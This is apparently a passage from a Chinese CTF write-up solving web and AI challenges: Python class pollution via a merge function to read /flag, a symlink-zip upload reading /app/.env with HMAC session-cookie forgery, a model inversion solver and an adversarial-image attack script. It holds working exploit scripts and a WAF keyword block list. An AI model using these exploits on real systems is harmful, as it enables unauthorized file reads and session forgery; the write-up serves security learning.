def waf_filter(input_str):
    if not input_str:
        return input_str
    input_str = str(input_str)
    dangerous_strings = [
        'class', 'bases', 'subclasses', 'mro', 'globals', 'builtins', 'import', 'eval', 
        'exec', 'open', 'file', 'read', 'write', 'os', 'subprocess', 'config', 'request', 
        'session', 'g', 'url_for', 'get_flashed_messages','{%', '%}', '{#', '#}', '{{', '}}'
    ]
    for string in dangerous_strings:
        if string in input_str:
            return "WAF blocked: Dangerous pattern detected"
    filtered = input_str.replace('<script>', '').replace('</script>', '')
    filtered = filtered.replace('javascript:', '')
    filtered = filtered.replace('onload=', '')
    filtered = filtered.replace('onerror=', '')
    if "hello" in filtered:
        filtered = filtered.replace("hello", "{{")
    if "hacker" in filtered:
        filtered = filtered.replace("hacker", "}}")
    return filtered


class User:
    def __init__(self, role='user'):
        self.username = None
        self.password = None
        self.role = role


def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)


def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization')
        if not token:
            return make_response('Authorization token is required.', 401)
        try:
            token = token.split(" ")[1]         # 提取令牌，假设格式为 'Bearer <token>'
            data = jwt.decode(token, app.config['SECRET_KEY'], algorithms=["HS256"])
            current_user = data['user']
            role = data['role']
        except Exception as e:
            return make_response(f'Invalid token: {str(e)}', 401)
        return f(current_user, role, *args, **kwargs)
    return decorated


@app.route('/register', methods=['POST'])
def register():
    data = request.json
    if not data:
        return make_response('Username and password are required.', 400)
    user = User()
    merge(data, user)
    if not user.username or not user.password:
        return make_response('Username and password are required.', 400)
    users[user.username] = user.password
    return make_response('Registration successful.', 201)


@app.route('/login', methods=['POST'])
def login():
    auth = request.json
    if not auth:
        return make_response('Username and password are required.', 400)
    username = auth.get('username')
    password = auth.get('password')
    if not username or not password:
        return make_response('Username and password are required.', 400)
    if users.get(username) != password:
        return make_response('Invalid username or password.', 401)
    token = jwt.encode(
        {
            'user': username,
            'role': 'user'
        },
        app.config['SECRET_KEY'],
        algorithm="HS256"
    )
    return jsonify({'token': token})


@app.route('/protected', methods=['GET'])
@token_required
def protected(current_user, role):
    if role != 'admin':
        return make_response(f'Access denied: User {current_user} ({role}) does not have sufficient privileges.', 403)
    filtered_user = waf_filter(current_user)
    return render_template_string(f"Hello, {filtered_user}! You have access to this protected resource.")


@app.route('/')
def index():
    with open('source/index.html', 'r', encoding='utf-8') as f:
        return f.read()


@app.route('/register')
def register_page():
    with open('source/register.html', 'r', encoding='utf-8') as f:
        return f.read()


@app.route('/success')
def success_page():
    with open('source/success.html', 'r', encoding='utf-8') as f:
        return f.read()


@app.route('/source')
def show_source():
    with open(__file__, 'r', encoding='utf-8') as f:
        return f.read()


if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

发现有 merge 函数，考察的是原型链污染，这里可以去污染 `SECRET_KEY`，也可以直接污染`__file__`

我这里是直接污染`__file__`为`/flag`，出题人很良心，没有改根目录下 flag 的文件名

```python
import requests
import json

target_url = "http://127.0.0.1:51852"

# 通过 globals 污染__file__
payload = {
    "username": "polluter2", 
    "password": "pass123",
    "__init__": {
        "__globals__": {
            "__file__": "/flag"
        }
    }
}

res = requests.post(f"{target_url}/register", json=payload)
print(res.text)
# {"message":"Registration successful."}
res = requests.get(f"{target_url}/source")
print(res.text)
# TSCTF-J{y0u_c0mp1373d_7h3_py_pr0813m}
```

### 题目名称 FileSystem（二血）

题目给了源码还有如下提示：

> 猜你想要：https://zh.wikipedia.org/wiki/符号链接

我们先审计代码，发现我们上传的文件会自动解压

![](imgs/image-20251012115054913.png)

因此这一步我们可以使用提示中的软链接来实现任意文件读取

但是在 entrypoint.sh 中发现 flag 所在的目录是八位随机字符组成的字符串

因此我们在读取 flag 前还需要先知道 flag 文件所在的目录

![](imgs/image-20251012120302251.png)

继续看代码，发现有个 /debug/files 的路由，可以通过 sessionId 查看任意用户上传的文件

![](imgs/image-20251012115219022.png)

继续跟进发现这个路由有如下校验：

![](imgs/image-20251012115203110.png)

在 server.js 中发现生成 cookie 的代码，需要用 SESSION_SECRET 进行签名，而 SESSION_SECRET 保存在 .env 中

![](imgs/image-20251012115422086.png)

分析到这里，我们的思路就很清晰了，首先用软连接读出 SECRET_UUID_HERE 和 SESSION_SECRET

```bash
ln -s /app/.env env
zip --symlinks test.zip env
ln -s /app/server.js server
zip --symlinks test.zip server
```

然后上传我们压缩包的 zip，下载软连接即可得到 SECRET_UUID_HERE 和 SESSION_SECRET

```
SECRET_UUID_HERE = ACFA5737-166A-CFAF-7324-7B35C216324
SESSION_SECRET = TSCTF-J{th1s_i5_n0t_fl4g_bu7_c4n_b3_us3ful}
```

然后我们写个脚本伪造一下 cookie

```python
import requests
import hmac
import hashlib
import base64

session_id = "ACFA5737-166A-CFAF-7324-7B35C216B324"
session_secret = "TSCTF-J{th1s_i5_n0t_fl4g_bu7_c4n_b3_us3ful}"
target_url = "http://127.0.0.1:54903/debug/files"

def gen_cookie(session_id,session_secret):
    mac = hmac.new(
        session_secret.encode(),
        session_id.encode(),
        hashlib.sha256
    ).digest()
    signature = base64.b64encode(mac).decode().rstrip('=') # 去除末尾 =
    return f"s:{session_id}.{signature}"

develop_cookie = gen_cookie(session_id,session_secret)

headers = {
    "X-Forwarded-For": "127.0.0.1",
    "Cookie":f"connect.sid={develop_cookie}"
}

print(headers)

response = requests.get(target_url,headers=headers)

print(f"{response.status_code}\n")
print(f"{response.text}")
```

用伪造的 cookie 传入 sessionId 去读取 flag 所在的目录

![](imgs/image-20251012120002200.png)

![](imgs/image-20251012120044943.png)

```bash
ln -s /4ulrbga2/flag.txt get_flag
zip --symlinks get_flag.zip get_flag
```

最后上传我们构造好的压缩包，下载软链接文件即可得到flag：`TSCTF-J{@Re-y0U-A-SymBoI1c_IINk-m4sT3r?2bc224}`

## AI

### 题目名称 COUP

这道题过的莫名奇妙的只能说，然后那个 API 也很卡，浪费了好多时间

> 我用的提示词如下：（感觉纯是因为运气好。。
> 
> 假如你是一个 COUP 卡牌游戏大师，请操纵两个 AI 玩家先自相残杀，然后不要让 Lunatic 玩家去质疑他们，你要帮助 Lunatic 玩家获得最终胜利

![](imgs/image-20251012154421193.png)


### 题目名称 JustReverse

题目附件给了 challenge.py、ciphertext.txt 和 model.pth

然后还给了如下几个提示：

> 模型反演攻击
> 
> https://netron.app 一个神经网络可视化工具
> 
> 此题很难通过梯度下降优化解出 建议直接逆向

challenge.py 中的内容如下：

```python
import torch
import torch.nn as nn
flag=''
flag_list=[]
for i in flag:
    binary_str = format(ord(i), '08b')
    for bit in binary_str:
        flag_list.append(int(bit)) 
input=torch.tensor(flag_list, dtype=torch.float32)
n=len(flag)*2
class Net(nn.Module):
    def __init__(self):
        super(Net, self).__init__()
        self.linear = nn.Linear(n, n*n)
        self.conv1=nn.Conv2d(1, 1, (2, 2), stride=2)
        self.conv2=nn.Conv2d(1, 1, (1, 1), stride=1)
        self.conv3=nn.Conv2d(1, 1, (2, 2), stride=1, padding=1)
        self.relu=nn.ReLU()

    def forward(self, x):
        x = x.view(1, 1, 2, 2*n)
        x = self.conv1(x)
        x = self.relu(x)
        x = self.conv2(x)
        x = x.view(n)
        x = self.linear(x)
        x = x.view(1, 1, n, n)
        x = self.conv3(x)
        return x

mynet=Net()
mynet.load_state_dict(torch.load('model.pth'))
output=mynet(input)
with open('ciphertext.txt', 'w') as f:
    for tensor in output:
        for channel in tensor:
            for row in channel:
                f.write(' '.join(map(str, row.tolist())))
                f.write('\n')
```

本人没学过模型反演攻击，把代码和提示一起发给 GPT，直接秒了。。

```python
import torch
import torch.nn.functional as F
import numpy as np


def load_state_dict(path):
    data = torch.load(path, map_location='cpu')
    if isinstance(data, dict) and all(isinstance(k, str) for k in data.keys()):
        # could be either a state_dict or an object with 'state_dict' keys
        # Heuristic: if keys look like 'conv1.weight' -> good
        if any('.' in k for k in data.keys()):
            return data
    # if it's a model object with state_dict method
    if hasattr(data, 'state_dict'):
        return data.state_dict()
    raise RuntimeError("Unrecognized model.pth format; expected state_dict or model object with .state_dict()")


def read_ciphertext(path):
    rows = []
    with open(path, 'r') as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            parts = line.split()
            rows.append([float(x) for x in parts])
    arr = np.array(rows, dtype=np.float64)
    return arr


def build_conv3_matrix(conv3_w_tensor, n):
    # conv3_w_tensor: torch tensor shape (1,1,2,2)
    # We'll build matrix A3 of shape ((n+1)^2, n*n) such that vec(O_without_bias) = A3 @ vec(M)
    conv3_w = conv3_w_tensor.clone().detach()
    out_h = n + 1
    out_w = n + 1
    total_out = out_h * out_w
    total_in = n * n
    A = np.zeros((total_out, total_in), dtype=np.float64)
    # prepare kernel tensor
    kernel = conv3_w.unsqueeze(0) if False else conv3_w  # shape (1,1,2,2)
    for idx in range(total_in):
        M = torch.zeros((1,1,n,n), dtype=torch.float32)
        r = idx // n
        c = idx % n
        M[0,0,r,c] = 1.0
        # conv2d with padding=1, bias=0
        out = F.conv2d(M, conv3_w, bias=None, padding=1, stride=1)
        out_np = out.detach().numpy().reshape(-1)  # length (n+1)*(n+1)
        A[:, idx] = out_np
    return A  # numpy array

def main():
    sd = load_state_dict('model.pth')

    # extract weights (robust to keys ordering)
    def get_tensor(k):
        if k in sd:
            return sd[k].cpu().float()
        # maybe keys contain 'module.' prefix (from DataParallel)
        for kk in sd:
            if kk.endswith(k):
                return sd[kk].cpu().float()
        raise KeyError(f"Cannot find weight key ending with '{k}' in state_dict keys.")

    conv1_w = get_tensor('conv1.weight')   # shape (1,1,2,2)
    conv1_b = get_tensor('conv1.bias')     # shape (1,)
    conv2_w = get_tensor('conv2.weight')   # shape (1,1,1,1)
    conv2_b = get_tensor('conv2.bias')     # shape (1,)
    linear_w = get_tensor('linear.weight') # shape (n*n, n)
    linear_b = get_tensor('linear.bias')   # shape (n*n,)
    conv3_w = get_tensor('conv3.weight')   # shape (1,1,2,2)
    conv3_b = get_tensor('conv3.bias')     # shape (1,)

    # load ciphertext
    out_arr = read_ciphertext('ciphertext.txt')  # shape (n+1, n+1)
    out_h, out_w = out_arr.shape
    if out_h != out_w:
        print("Warning: ciphertext not square, continuing.")
    out_size = out_h
    n = out_h - 1
    print(f"Detected n = {n} (so flag length L = n/2 = {n//2})")
    L = n // 2
    if n % 2 != 0:
        print("Warning: n not divisible by 2. Proceeding anyway.")

    # convert everything to numpy for linear algebra
    vecO = out_arr.reshape(-1).astype(np.float64)
    conv3_bias = float(conv3_b.item())
    # build A3
    print("Building conv3 linear mapping matrix A3 (this may take a moment)...")
    A3 = build_conv3_matrix(conv3_w, n)  # shape ((n+1)^2, n*n)
    # solve A3 @ vecM = vecO - conv3_bias
    rhs = vecO - conv3_bias
    # use least squares
    print("Solving for vec(M) via least squares ...")
    vecM_sol, residuals, rank, s = np.linalg.lstsq(A3, rhs, rcond=None)
    # round small numerical noise
    vecM = np.round(vecM_sol, decimals=6)
    # If entries should be integers, round to nearest integer
    # but linear layer outputs could be floats; we'll keep floats but try to match numerically
    M = vecM.reshape((n, n))
    print("Recovered matrix M (shape {}x{}).".format(n, n))

    # now inverse linear: linear_w @ z + linear_b = vecM  -> solve for z (length n)
    W = linear_w.detach().numpy().astype(np.float64)  # shape (n*n, n)
    b_lin = linear_b.detach().numpy().astype(np.float64)  # shape (n*n,)
    rhs2 = vecM - b_lin
    print("Solving linear layer for z (length n)...")
    # Solve W @ z = rhs2
    z_sol, residuals2, rank2, s2 = np.linalg.lstsq(W, rhs2, rcond=None)
    z = np.array(z_sol).reshape(-1)
    # If solution should be near integers or small floats, round a bit
    # Next conv2: conv2 is 1x1 conv: x' = conv2_w * z + conv2_b
    # so conv1_out = (z - conv2_b) / conv2_w
    w2 = float(conv2_w.view(-1).item())
    b2 = float(conv2_b.view(-1).item())
    if abs(w2) < 1e-12:
        raise RuntimeError("conv2 weight too small, cannot invert.")
    conv1_out = (z - b2) / w2
    # conv1_out should be length n
    # Now invert conv1 per 2x2 block by brute forcing 16 possibilities per block (bits are 0/1)
    conv1_k = conv1_w.detach().numpy().reshape(4)  # flattened 4 elements in order [0,0],[0,1],[1,0],[1,1] maybe
    conv1_bval = float(conv1_b.view(-1).item())
    # Need to be careful about indexing order: conv1 kernel shape (1,1,2,2)
    # When we flattened as above, we must use matching order to compute k dot block
    k00 = float(conv1_w[0,0,0,0].item())
    k01 = float(conv1_w[0,0,0,1].item())
    k10 = float(conv1_w[0,0,1,0].item())
    k11 = float(conv1_w[0,0,1,1].item())
    kvals = np.array([k00, k01, k10, k11], dtype=np.float64)

    total_input_bits = 4 * n  # equals 8 * L
    bits = np.zeros(total_input_bits, dtype=np.int64)

    tol = 1e-3
    ambiguous_blocks = 0

    print("Inverting conv1 blocks by brute-force over 16 binary combinations per 2x2 block...")
    for t in range(n):
        target = conv1_out[t]
        found = None
        candidates = []
        # 4 positions map to indices:
        # row0 col 2*t  -> bit index = 2*t
        # row0 col 2*t+1 -> bit index = 2*t+1
        # row1 col 2*t  -> bit index = 2*n + 2*t
        # row1 col 2*t+1 -> bit index = 2*n + 2*t+1
        idxs = [2*t, 2*t+1, 2*n + 2*t, 2*n + 2*t+1]
        for comb in range(16):
            b0 = (comb >> 3) & 1
            b1 = (comb >> 2) & 1
            b2_ = (comb >> 1) & 1
            b3 = comb & 1
            vec = np.array([b0, b1, b2_, b3], dtype=np.float64)
            pred = float(np.dot(kvals, vec) + conv1_bval)
            if abs(pred - target) < tol:
                candidates.append((comb, pred))
        if len(candidates) == 0:
            # try relaxed tol
            for comb in range(16):
                b0 = (comb >> 3) & 1
                b1 = (comb >> 2) & 1
                b2_ = (comb >> 1) & 1
                b3 = comb & 1
                vec = np.array([b0, b1, b2_, b3], dtype=np.float64)
                pred = float(np.dot(kvals, vec) + conv1_bval)
                # pick closest
                # we'll compute distance and choose min later
            # choose minimum-distance combination
            best_comb = None
            best_err = float('inf')
            for comb in range(16):
                b0 = (comb >> 3) & 1
                b1 = (comb >> 2) & 1
                b2_ = (comb >> 1) & 1
                b3 = comb & 1
                vec = np.array([b0, b1, b2_, b3], dtype=np.float64)
                pred = float(np.dot(kvals, vec) + conv1_bval)
                err = abs(pred - target)
                if err < best_err:
                    best_err = err
                    best_comb = comb
            # accept best even if error not tiny
            comb = best_comb
            b0 = (comb >> 3) & 1
            b1 = (comb >> 2) & 1
            b2_ = (comb >> 1) & 1
            b3 = comb & 1
            bits[idxs[0]] = b0
            bits[idxs[1]] = b1
            bits[idxs[2]] = b2_
            bits[idxs[3]] = b3
            ambiguous_blocks += 1
        else:
            # if multiple candidates, pick the one with minimal abs(pred-target)
            best = min(candidates, key=lambda x: abs(x[1]-target))
            comb = best[0]
            b0 = (comb >> 3) & 1
            b1 = (comb >> 2) & 1
            b2_ = (comb >> 1) & 1
            b3 = comb & 1
            bits[idxs[0]] = b0
            bits[idxs[1]] = b1
            bits[idxs[2]] = b2_
            bits[idxs[3]] = b3

    if ambiguous_blocks > 0:
        print(f"Warning: {ambiguous_blocks} blocks had to use nearest-match (relaxed).")

    # Now bits is length 8*L, reconstruct bytes (format(ord(i),'08b') used MSB-first)
    bytes_list = []
    for i in range(L):
        byte_bits = bits[8*i:8*i+8]
        s = ''.join(str(int(b)) for b in byte_bits)
        val = int(s, 2)
        bytes_list.append(val)
    try:
        flag = ''.join(chr(b) for b in bytes_list)
    except:
        flag = ''.join((chr(b) if 32 <= b < 127 else '?') for b in bytes_list)

    print(f"Recovered bytes: {bytes_list}")
    print(f"Recovered_string: {flag}")
    # Recovered_string: TSCTF-J{NotReverseButInverse}

if __name__ == '__main__':
    main()

```

![](imgs/image-20251012212828758.png)

### 题目名称 Rabbit-Duck-Puzzle（三血）

题目附件给了 challenge.py、gift.py、model.pkl、还有下面这张 origin_image.png

![](imgs/image-20251012220735741.png)

```python
# challenge.py
import numpy as np
from PIL import Image
from skimage.feature import hog
from skimage.color import rgb2gray
from skimage.transform import resize
import joblib
import socket
import base64
import io
import os

if os.path.exists("/flag"):
    with open("/flag", "r") as f:
        FLAG = f.read().strip()
else:
    FLAG = "TSCTF-J{this_is_a_placeholder_flag}"

MODEL = joblib.load("model.pkl")

IMG_SIZE = (256, 256)
HOG_PARAMS = {
    "orientations": 9,
    "pixels_per_cell": (16, 16),
    "cells_per_block": (2, 2),
    "block_norm": "L2-Hys"
}


def extract_hog_features(image):
    img = np.array(image)
    img = resize(img, IMG_SIZE)
    gray = rgb2gray(img)
    features = hog(gray, **HOG_PARAMS)
    return features.reshape(1, -1)


def check(your_image):
    origin_image = Image.open("./origin_image.png")
    origin_image_array = np.array(origin_image)
    your_image_array = np.array(your_image)

    if your_image_array.shape != (256, 256, 3):
        return False, "😎 Cabelis's eyes are sharp... They are different images!"

    average_diff = np.mean(
        np.abs(origin_image_array.astype(np.int32) - your_image_array.astype(np.int32)).astype(np.uint8)
    )
    max_diff = np.max(
        np.abs(origin_image_array.astype(np.int32) - your_image_array.astype(np.int32)).astype(np.uint8)
    )

    if average_diff > 25 or max_diff > 50:
        return False, "😎 Cabelis's eyes are sharp... They are different images!"

    return True, "😉 Cabelis is satisfied with your image!"


def evaluate(your_image):
    clf = MODEL
    class_names = ['Duck', 'Rabbit']

    features = extract_hog_features(your_image)

    predicted_class = clf.predict(features)[0]
    probabilities = clf.predict_proba(features)[0]

    result = {
        "predicted_class": class_names[predicted_class],
        "probabilities": dict(zip(class_names, probabilities))
    }
    return result


def handle_client(conn):
    try:
        # 接收数据
        adv = b""
        while True:
            temp = conn.recv(4096)
            adv += temp
            if adv.endswith(b"Merak^^"):
                adv = adv[:-7]  # 去掉结束符
                break

        if not adv:
            conn.sendall("😅 No data received.".encode())
            return

        # 解码base64
        try:
            img_bytes = base64.b64decode(adv)
            img = Image.open(io.BytesIO(img_bytes)).convert("RGB")
        except Exception as e:
            conn.sendall(f"😅 Invalid image data. {e}".encode())
            return

        # 执行check
        passed, msg = check(img)
        conn.sendall(msg.encode() + b"\n")
        
        if not passed:
            return

        # 执行evaluate
        result = evaluate(img)
        response = f"Predicted class: {result['predicted_class']}\n"
        response += f"Probabilities: {result['probabilities']}\n"

        if result["predicted_class"] == "Rabbit":
            response += f"🥳 Your gift: {FLAG}"
        else:
            response += f"🤔 Try again..."

        conn.sendall(response.encode() + b"\n")

    except Exception as e:
        conn.sendall(f"🤯 Error: {e}".encode())
    finally:
        conn.close()


def main():
    HOST = "0.0.0.0"
    PORT = 5000
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[*] Server listening on {HOST}:{PORT}")

    while True:
        conn, addr = server.accept()
        print(f"[*] Accepted connection from {addr}")
        handle_client(conn)


if __name__ == '__main__':
    main()
```


```python
# gift.py
import socket
import base64

def send_image(img_path, host="127.0.0.1", port=1234):
    with open(img_path, "rb") as f:
        img_b64 = base64.b64encode(f.read())

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    try:
        sock.sendall(img_b64)
        sock.sendall(b"Merak^^")

        response = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk

        print("=== Server Response ===")
        print(response.decode(errors="ignore"))

    finally:
        sock.close()


if __name__ == "__main__":
    send_image("your_image.png")
```

遛一遛 GPT 就出了。。

```python
import os
import io
import socket
import base64
import time
import numpy as np
from PIL import Image
import joblib
from skimage.feature import hog
from skimage.color import rgb2gray
from skimage.transform import resize

# ------------------ 配置 ------------------
HOST = "127.0.0.1"
PORT = 53798
END_MARK = b"Merak^^"

ORIGIN_PATH = "origin_image.png"
MODEL_PATH = "model.pkl"
OUT_PATH = "adv_found.png"

IMG_SIZE = (256, 256)
HOG_PARAMS = {
    "orientations": 9,
    "pixels_per_cell": (16, 16),
    "cells_per_block": (2, 2),
    "block_norm": "L2-Hys"
}

# 服务端 check 的阈值
MAX_AVG_DIFF = 25.0
MAX_PERPIXEL_DIFF = 50

# 攻击超参数（可调）
MAX_ITERS = 8000
PATCH_SIZE = 12         # patch 边长（像素）— 对应 12x12 block 作梯度估计
N_PATCHES_PER_ITER = 40 # 每次估计的随机 patch 数
EPS = 6                 # finite difference 的扰动幅度（用于估计导数）
STEP = 6                # 每次实际应用到 patch 的步长
TOP_K = 6               # 选择前 K 个最有利的 patch 同时应用（按梯度）
RANDOM_SEED = 1337
VERBOSE = True
# -------------------------------------------

np.random.seed(RANDOM_SEED)


def extract_hog_features(image):
    """与服务端相同的特征提取（尽量复现）"""
    arr = np.array(image)
    img = resize(arr, IMG_SIZE)  # skimage resize -> float
    gray = rgb2gray(img)
    features = hog(gray, **HOG_PARAMS)
    return features.reshape(1, -1)


def model_probs_for_array(model, arr):
    """返回 predict_proba 的结果（长度>=2），并容错处理"""
    feat = extract_hog_features(arr)
    if hasattr(model, "predict_proba"):
        probs = model.predict_proba(feat)[0]
        return np.array(probs)
    else:
        # fallback: try decision_function -> sigmoid
        if hasattr(model, "decision_function"):
            dec = model.decision_function(feat)[0]
            # binary -> map to probability
            if np.ndim(dec) == 0:
                p = 1.0 / (1.0 + np.exp(-dec))
                return np.array([1 - p, p])
        # 最后退回 predict
        pred = model.predict(feat)[0]
        out = np.zeros(2)
        # assume labels 0/1 or classes_ present
        if hasattr(model, "classes_"):
            # try to find index of class equal to pred
            classes = np.array(model.classes_)
            idx = np.where(classes == pred)[0]
            if idx.size:
                out[idx[0]] = 0.999
        else:
            out[pred] = 0.999
        out[(out == 0).nonzero()[0]] = 0.001
        return out


def check_constraints(origin_arr, delta_arr):
    """
    origin_arr: uint8 original image
    delta_arr: int32 delta applied (can be negative)
    返回: (ok_bool, avg_diff, max_diff)
    """
    cand = origin_arr.astype(np.int32) + delta_arr.astype(np.int32)
    diff = np.abs(cand - origin_arr.astype(np.int32)).astype(np.int32)
    avg = float(np.mean(diff))
    mx = int(np.max(diff))
    ok = (avg <= MAX_AVG_DIFF + 1e-9) and (mx <= MAX_PERPIXEL_DIFF)
    return ok, avg, mx


def project_delta_to_constraints(origin_arr, delta_arr):
    """
    将 delta 投影到满足 max per-pixel 差和 average 差预算:
    - 先强制每像素差绝对值 ≤ MAX_PERPIXEL_DIFF
    - 再按比例缩放使平均差 ≤ MAX_AVG_DIFF（L1 风格缩放）
    返回被限制后的 delta (int32)
    """
    delta = delta_arr.copy().astype(np.int32)
    # 每像素上限
    delta = np.clip(delta, -MAX_PERPIXEL_DIFF, MAX_PERPIXEL_DIFF)

    diff = np.abs(delta).astype(np.float64)
    avg = float(np.mean(diff))
    if avg <= MAX_AVG_DIFF:
        return delta
    # 需要缩放：scale factor s in (0,1] such that mean(|s*delta|) = MAX_AVG_DIFF
    s = MAX_AVG_DIFF / (avg + 1e-12)
    delta = (delta.astype(np.float64) * s).astype(np.int32)
    # clamp again just in case
    delta = np.clip(delta, -MAX_PERPIXEL_DIFF, MAX_PERPIXEL_DIFF)
    return delta


def send_image_to_server(img_arr):
    buf = io.BytesIO()
    Image.fromarray(img_arr).save(buf, format="PNG")
    img_b = buf.getvalue()
    b64 = base64.b64encode(img_b)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(8)
    sock.connect((HOST, PORT))
    try:
        sock.sendall(b64)
        sock.sendall(END_MARK)
        resp = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp += chunk
            except socket.timeout:
                break
    finally:
        sock.close()
    return resp


def random_patch_positions(h, w, patch_size, n):
    ys = np.random.randint(0, h - patch_size + 1, size=n)
    xs = np.random.randint(0, w - patch_size + 1, size=n)
    return list(zip(ys, xs))


def apply_patch_delta(delta_arr, y, x, patch_size, val):
    delta_arr[y:y+patch_size, x:x+patch_size, :] += val
    return delta_arr


def main():
    if not os.path.exists(ORIGIN_PATH):
        print("Missing origin image:", ORIGIN_PATH); return
    if not os.path.exists(MODEL_PATH):
        print("Missing model file:", MODEL_PATH); return

    origin_img = Image.open(ORIGIN_PATH).convert("RGB")
    origin_img = origin_img.resize(IMG_SIZE)
    origin_arr = np.array(origin_img).astype(np.uint8)
    h, w, c = origin_arr.shape

    model = joblib.load(MODEL_PATH)

    # determine Rabbit index in model's predict_proba output
    rabbit_index = 1
    if hasattr(model, "classes_"):
        classes = np.array(model.classes_)
        # try to find label '1' (because server used predicted_class int 1 -> Rabbit)
        idxs = np.where(classes == 1)[0]
        if idxs.size:
            rabbit_index = int(idxs[0])
        else:
            # fallback: if classes are strings, try 'Rabbit'
            idxs = np.where(classes == "Rabbit")[0]
            if idxs.size:
                rabbit_index = int(idxs[0])
            else:
                # else keep rabbit_index=1 (most likely correct)
                rabbit_index = 1

    # baseline
    base_probs = model_probs_for_array(model, origin_arr)
    baseline_rabbit_prob = base_probs[rabbit_index] if rabbit_index < len(base_probs) else base_probs[-1]
    print(f"[+] Baseline Rabbit prob: {baseline_rabbit_prob:.6f}")

    # accumulated delta relative to origin (int32)
    accum_delta = np.zeros_like(origin_arr, dtype=np.int32)

    best_delta = accum_delta.copy()
    best_prob = baseline_rabbit_prob
    best_img = origin_arr.copy()

    start_time = time.time()

    for it in range(1, MAX_ITERS + 1):
        # sample random patch positions
        patches = random_patch_positions(h, w, PATCH_SIZE, N_PATCHES_PER_ITER)

        grads = []
        # estimate gradient for each patch via symmetric finite-difference:
        # compute p(rabbit | origin + accum + +EPS on patch) - p(rabbit | origin + accum + -EPS on patch) / (2*EPS)
        for (y, x) in patches:
            # candidate plus
            delta_plus = accum_delta.copy()
            apply_patch_delta(delta_plus, y, x, PATCH_SIZE, EPS)
            proj_plus = project_delta_to_constraints(origin_arr, delta_plus)
            cand_plus = np.clip(origin_arr.astype(np.int32) + proj_plus, 0, 255).astype(np.uint8)

            probs_plus = model_probs_for_array(model, cand_plus)
            p_plus = probs_plus[rabbit_index] if rabbit_index < len(probs_plus) else probs_plus[-1]

            # candidate minus
            delta_minus = accum_delta.copy()
            apply_patch_delta(delta_minus, y, x, PATCH_SIZE, -EPS)
            proj_minus = project_delta_to_constraints(origin_arr, delta_minus)
            cand_minus = np.clip(origin_arr.astype(np.int32) + proj_minus, 0, 255).astype(np.uint8)

            probs_minus = model_probs_for_array(model, cand_minus)
            p_minus = probs_minus[rabbit_index] if rabbit_index < len(probs_minus) else probs_minus[-1]

            # finite difference estimate
            grad_est = (p_plus - p_minus) / (2.0 * EPS)
            grads.append(((y, x), grad_est))

        # choose top-k patches by positive gradient
        grads_sorted = sorted(grads, key=lambda kv: kv[1], reverse=True)
        chosen = [(pos, g) for (pos, g) in grads_sorted[:TOP_K] if g > 0]

        improved = False
        # apply chosen updates in one combined delta
        if chosen:
            trial_delta = accum_delta.copy()
            for (y, x), g in chosen:
                # apply step in sign of gradient
                val = int(np.sign(g) * STEP)
                apply_patch_delta(trial_delta, y, x, PATCH_SIZE, val)

            # project to constraints
            trial_proj = project_delta_to_constraints(origin_arr, trial_delta)
            cand_img = np.clip(origin_arr.astype(np.int32) + trial_proj, 0, 255).astype(np.uint8)

            # evaluate
            probs = model_probs_for_array(model, cand_img)
            rabbit_prob = probs[rabbit_index] if rabbit_index < len(probs) else probs[-1]

            if rabbit_prob > best_prob + 1e-9:
                # accept
                accum_delta = trial_proj.copy()
                best_prob = rabbit_prob
                best_delta = accum_delta.copy()
                best_img = cand_img.copy()
                improved = True
                if VERBOSE:
                    ok, avg, mx = check_constraints(origin_arr, accum_delta)
                    print(f"[{it}] improved -> rabbit_prob={best_prob:.6f}  avg_diff={avg:.3f} max_diff={mx}  applied_patches={len(chosen)}")

        # occasionally try single-patch greedy if no improvement (smaller step)
        if (not improved):
            # try smaller single-patch updates (try top few)
            for (y, x), g in grads_sorted[:6]:
                if g <= 0:
                    break
                trial_delta = accum_delta.copy()
                apply_patch_delta(trial_delta, y, x, PATCH_SIZE, int(np.sign(g) * max(2, STEP//2)))
                trial_proj = project_delta_to_constraints(origin_arr, trial_delta)
                cand_img = np.clip(origin_arr.astype(np.int32) + trial_proj, 0, 255).astype(np.uint8)
                probs = model_probs_for_array(model, cand_img)
                rabbit_prob = probs[rabbit_index] if rabbit_index < len(probs) else probs[-1]
                if rabbit_prob > best_prob + 1e-9:
                    accum_delta = trial_proj.copy()
                    best_prob = rabbit_prob
                    best_delta = accum_delta.copy()
                    best_img = cand_img.copy()
                    improved = True
                    if VERBOSE:
                        ok, avg, mx = check_constraints(origin_arr, accum_delta)
                        print(f"[{it}] improved(single) -> rabbit_prob={best_prob:.6f} avg_diff={avg:.3f} max_diff={mx} patch=({y},{x})")
                    break

        # status print
        if it % 50 == 0 or improved:
            elapsed = time.time() - start_time
            print(f"[it {it}] best_prob={best_prob:.6f} elapsed={elapsed:.1f}s")

        # success condition: model would predict Rabbit (prob >= 0.5)
        if best_prob > 0.5:
            print(f"[SUCCESS] Found adversarial image with rabbit_prob={best_prob:.6f} at iter {it}")
            Image.fromarray(best_img).save(OUT_PATH)
            print(f"[+] Saved adversarial image -> {OUT_PATH}")
            try:
                resp = send_image_to_server(best_img)
                print("=== Server Response ===")
                print(resp.decode(errors="ignore"))
            except Exception as e:
                print("Failed to send to server:", e)
            return

    # end iterations
    print("[DONE] Reached max iterations without achieving rabbit_prob>=0.5")
    print(f"[INFO] Best rabbit prob achieved: {best_prob:.6f}")
    Image.fromarray(best_img).save(OUT_PATH)
    print(f"[+] Saved best candidate -> {OUT_PATH}")
    try:
        resp = send_image_to_server(best_img)
        print("=== Server Response ===")
        print(resp.decode(errors="ignore"))
    except Exception as e:
        print("Failed to send to server:", e)


if __name__ == "__main__":
    main()
```

